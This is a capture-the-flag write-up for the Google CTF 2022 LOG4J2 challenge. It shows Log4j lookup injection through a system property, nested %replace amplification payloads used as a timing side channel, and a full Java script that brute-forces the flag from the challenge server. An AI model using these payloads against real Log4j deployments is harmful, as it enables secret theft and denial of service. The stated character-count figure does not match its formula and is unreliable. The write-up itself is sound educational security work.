---
layout: isl-research-post
title: "Google CTF 2022 – LOG4J2 – Writeup"
---

# Google CTF 2022 – LOG4J2 – Writeup
*TLDR: Side-channel-based timing attack via "format string" injection.* \
218 points and 43 solves. \
Flag: `CTF{and-you-thought-it-was-over-didnt-you}`

For this challenge, we are given a Java "chatbot" application that uses Log4j 2.17.2 and a (Python) Flask-based web application that interfaces with the chatbot via command line.

## Analyzing the Web Interface
After navigating to the [challenge website](https://log4j2-web.2022.ctfcompetition.com/), we are greeted with a field for our input command and a submit button.
As with every unknown tool, we try entering `help` as a command.
That gives us this response:
> Try some of our free commands below! wc time repeat

After trying, for example, the `time` command, we are reminded that we have to prefix commands with a slash. As all three commands don't seem useful for getting the flag, we analyze the next part of the challenge.

## Analyzing the Flask Application
On receiving a `POST` request the application extracts the `text` we supplied as a command and splits it into a string array by space.

For example, if we send `/repeat hello world`, we'll get `["/repeat", "hello", "world"]`.
Element zero of the array (`"/repeat"`) is the command that will be passed to the chatbot, while the following elements are the arguments to the command.

The chatbot response is received by passing the `cmd` as a *system property* to the Java application and the chatbot command arguments as ordinary arguments. \
A timeout of 10 seconds is applied and the standard output of the process will be returned and sent to the chatbot user.
```python
res = subprocess.run(['java', '-jar', '-Dcmd=' + cmd, 'chatbot/target/app-1.0-SNAPSHOT.jar', '--', text], capture_output=True, timeout=10)
return res.stdout.decode('utf-8')
```


## Analyzing the Java Application
The Java application is a standard Apache Maven-based project that uses Log4j 2.17.2.
By looking at the `pom.xml` file, we learn that the main class that is executed by the above command is in the package `com.google.app` and has the class name `App` [^only_one_java_file].

[^only_one_java_file]: As there actually is only one Java file in the project, this was somewhat redundant.


Looking at the `App` class, there is not much code:
First, the code performs some sanity checks regarding the flag, then it logs the `args` that are given by us, and finally, it acts on the given command by printing a result to standard output that is then returned to the chatbot user.
```java
public class App {
  public static Logger LOGGER = LogManager.getLogger(App.class); // <- from Log4j
  public static void main(String[]args) {
    // sanity check code removed
  
    LOGGER.info("msg: {}", args);

    // act on the command
  }
```

The sanity check code tells us that the flag is stored in the `FLAG` environment variable and starts with `CTF`.

### Getting the Flag From the Environment
So how can we get the flag from the environment?
From the recent [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell) vulnerability, I remembered an article that discussed web application firewall (WAF) bypasses [^log4j_waf_bypass].
One such bypass used `${env:ENV_NAME:-default_value}` to hide the `jndi` string, by replacing it with `${env:ENV_NAME:-j}ndi`.
This works because the environment lookup uses `j` as result when no `ENV_NAME` variable exists; `j` is then concatenated with `ndi` to form `jndi`.

[^log4j_waf_bypass]: [https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#1-system-environment-variables](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#1-system-environment-variables).

If we try to inject `${env:FLAG}` into the arguments of a command such as `/repeat ${env:FLAG}`, we unfortunately only get `${env:FLAG}` back.
The idea was that maybe `LOGGER.info("msg: {}", args);` would evaluate the environment lookup.

To gain more insight into this idea, we can deploy the challenge locally by building and running the provided `Dockerfile`.
After running `/repeat ${env:FLAG}` again, we find this log message:
> [...] com.google.app.App executing /repeat - msg: --

This doesn't contain any of our arguments!?

This idea doesn't work for two reasons:
1. The Flask application always runs the Java application with `--` as the first argument and Log4j only logs as many array elements as there are `{}`-s in the log message (in our case there is only one `{}`).
2. Starting with version 2.16.0, Log4j does not evaluate `${env:FLAG}` and similar *lookups* in log messages anymore.

The [security page](https://logging.apache.org/log4j/2.x/security.html) of Log4j helpfully states:
> From version 2.16.0 (for Java 8), the message lookups feature has been completely removed. **Lookups in configuration still work.**

If we look at the Log4j configuration file (`chatbot/src/main/resources/log4j2.xml`) we can find this [pattern layout](https://logging.apache.org/log4j/2.x/manual/layouts.html#Pattern_Layout): \
`%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n` \
The important part is `${sys:cmd}`; this refers to the command that is passed as a system property to the Java application.

If we try running `/${env:FLAG}`, Log4j first will resolve `${sys:cmd}` to `${env:FLAG}` and then resolve `${env:FLAG}`, but we will only get back this:
> Sorry, you must be a premium member in order to run this command.

But when we look at the log output, we will get this 🎉
> [...] com.google.app.App executing **/CTF{REDACTED}** - msg: --

Now that we know how to access the flag, how do we extract it? We only have access to the log output locally!

### Extracting the Flag
While Log4j prints the value of the flag to the log, this output is redirected to standard error [^unintended_solution] and not standard out. The Flask application only sends back the standard output.

[^unintended_solution]: The unintended solution to the first LOG4J challenge was `/${java:${env:FLAG}}`. This worked because the challenge authors assumed that *all* logging output would be directed to standard error, as defined in `log4j2.xml`. However, the unintended solution triggers an exception *inside* Log4j and is logged by the special `StatusLogger` instead[^log4j_status_logger_call], bypassing the configuration file. The `StatusLogger` then logs to standard output, which is captured, leading to the unintended solution.

[^log4j_status_logger_call]: As can be seen in the [StrSubstitutor.java](https://github.com/apache/logging-log4j2/blob/c1d2e6c5a273b0c145ce68193284a56a1da98f2a/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.java#L1185) file.
What we need to extract the flag is a *side-channel*:
> a side-channel is any extra information that can be gathered because of the way an algorithm is implemented, rather than flaws in the design of the algorithm itself [^wikipedia_side_channel].

[^wikipedia_side_channel]: Adapted from Wikipedia article on [side-channel attacks](https://en.wikipedia.org/wiki/Side-channel_attack).
An obvious side-channel is timing information: measuring how long an operation takes and deducing something from it.

In our case, we'd like to be able to guess the flag *character by character*. If a character matches, there should be a small timing difference, confirming our guess.
#### Failed Attack
After looking at the different supported [patterns](https://logging.apache.org/log4j/2.x/manual/layouts.html#Patterns), I noticed the `replace` and `repeat` patterns.

The pattern `replace{input}{regex}{substitution}` takes an input and replaces all `input` that matches `regex` with the given `substitution`.
The `repeat` pattern should be self-explaining: `repeat{string}{length}`.

My first idea was to combine the two patterns:
1. If all characters of the flag are matched and the first character of the flag is `R` [^character_by_character], replace them all with a large number:
`/%replace{${env:FLAG}}{CTF.R.*}{9999999}`
2. Use the resulting text as an argument to the `repeat` pattern such that we'd try to repeat a string many times, leading to a noticeable timing difference between correctly/incorrectly guessing the starting part of the flag.

[^character_by_character]: This allows character by character guessing. The pattern `CTF.R.*` checks whether the flag starts with `R` and ignores the rest of the flag. We can then start trying all possible symbols of length 1 in place of `R`, then length 2, ..., until a maximum length.

The final attack looked like this: \
{% raw  %}`/%repeat{anyString}{\%replace{${env:FLAG}}{CTF.R.*}{9999999}}`{% endraw %}

Unfortunately, this does not work at all. Instead, we can see this in the logs:
> The repeat count is not an integer: %replace{${env:FLAG}}{CTF.R.*}{9999999}

The problem lies in the fact that `repeat` does **not** evaluate its arguments, so it tries to parse `%replace{${env:FLAG}}{CTF.R.*}{9999999}` as an integer, which fails as expected. We therefore need another attack.

#### (Intended Solution) Regex Denial of Service (ReDoS)
> Regex denial of service is an algorithmic complexity attack that produces a denial-of-service by providing a regular expression and/or an input that takes a long time to evaluate [^wikipedia_redos].

[^wikipedia_redos]: Adapted from Wikipedia article on [ReDoS](https://en.wikipedia.org/wiki/ReDoS).

Most regex implementations are vulnerable to ReDoS — and so is the Java regex implementation.
Using the `%replace` pattern, can we perform a ReDoS attack and use the timing difference as our side-channel?

As a first step, I wanted to perform a simple ReDoS attack; this code [^stackoverflow_redos] will take a very long time to execute:

[^stackoverflow_redos]: Adapted from this [Stack Overflow question](https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable).
```java
Pattern.compile("(((a+)+)+)+")
.matcher("aaaaaaaaaaaaaaaaaaaaaaaaaaaa!")
.matches()
```
Unfortunately, we are not *matching* a string, but *replacing* it.
If we replace the `matches` call with a `replaceAll("foo")` call [^log4j_regex_source], the execution will **not** hang.

[^log4j_regex_source]: This is precisely what Log4j does when encountering `%replace`: [RegexReplacementConverter.java](https://github.com/apache/logging-log4j2/blob/f72100df0decc9bda96b4d769822c4e48b2848fc/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/RegexReplacementConverter.java#L95).

As the ReDoS did not work when replacing text (and it was also pretty late at night already), I decided to try another attack that is similar in spirit to ReDoS.

(The *intended* solution was a ReDoS attack and leaking the flag character by character by observing the timing differences. The regex was crafted in such a way that ReDoS would only fire when the guessed flag matches.)

#### Working Attack Using Amplification
We can reuse parts of the [failing attack](#failed-attack): \
`/%replace{${env:FLAG}}{CTF.R.*}{9999999}`

There will be a measurable difference between the flag starting with `R` and not. Unfortunately, this difference is too small to be measured remotely.

My solution to this was an amplification attack: \
repeatedly apply `replace` on previous `replace` calls. Like this (new lines added for clarity):
```
/%replace{
%replace{
%replace{
%replace{
%replace{
%replace{
%replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
}{#}{######################################################}
```
If the flag starts with `flagGuess`, the whole flag is replaced with 29 `#`-s (I used this character because it would likely not be part of the flag). Each of the resulting 29 `#`-s is then replaced by 54 `#`-s. This process is repeated 6 times, leading to a total of `29*54*54^6* = 96816014208` `#`-s!

Replacing so many `#`-s will trigger the 10-second timeout of the Flask application, which in turn will result in the HTTP status code 500 being sent to the user. (If the flag does not start with `flagGuess`, we will receive a non-500 status code)

We can now brute-force the flag character by character, verifying our guess by looking at the status code.

After implementing the idea in Java, I got the inner part of the flag: \
**`and-you-thought-it-was-over-didnt-you`**

### Java Source Code

{% raw  %}
```java
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;

public class Log4JBruteForcer {
  private static HttpClient client = HttpClient.newHttpClient();

  public static void main(String[] args) throws Exception {
    String flagPart = "";
    for (int i = 0; i < 100; i++) {
      String fakeFinalFlagPart = flagPart;
      int newFlagPart = CHARS_FOR_GUESSING.chars().parallel()
          .filter(it -> isFlagGuessValid(fakeFinalFlagPart + Character.toString(it)))
          .findAny().orElseThrow();
      flagPart += Character.toString(newFlagPart);
      System.out.println(flagPart);
    }
  }

  static String CHAR_LOWER_HEX = "abcdef";
  static String CHAR_LOWER_OTHER = "ghijklmnopqrstuvwxyz";
  static String CHAR_UPPER = (CHAR_LOWER_HEX + CHAR_LOWER_OTHER).toUpperCase();
  static String NUMBER = "0123456789";
  static String SPECIAL = "_-+";

  static String CHARS_FOR_GUESSING = CHAR_LOWER_HEX + CHAR_LOWER_OTHER +
                                     NUMBER + SPECIAL + CHAR_UPPER;

  private static boolean isFlagGuessValid(String flagGuess) {
    HttpRequest request;
    try {
      request = HttpRequest.newBuilder()
          .uri(new URI("https://log4j2-web.2022.ctfcompetition.com/"))
          .headers("Content-Type", "application/x-www-form-urlencoded")
          .POST(HttpRequest.BodyPublishers.ofString(
              "text=/" + "%replace{".repeat(7) + "${ENV:FLAG}}{CTF\\{"
                  + flagGuess
                  + ".*\\}}{#############################}}{#}"
                  + "{######################################################}}{#}".repeat(6)
                  + "{######################################################}"))
          .build();
    } catch (URISyntaxException e) {
      throw new RuntimeException(e);
    }
    HttpResponse<String> result;
    try {
      result = client.send(request, BodyHandlers.ofString());
    } catch (IOException | InterruptedException e) {
      throw new RuntimeException(e);
    }
    if (result.statusCode() == 500) {
      return true;
    } else {
      return false;
    }
  }
}
```
{% endraw  %}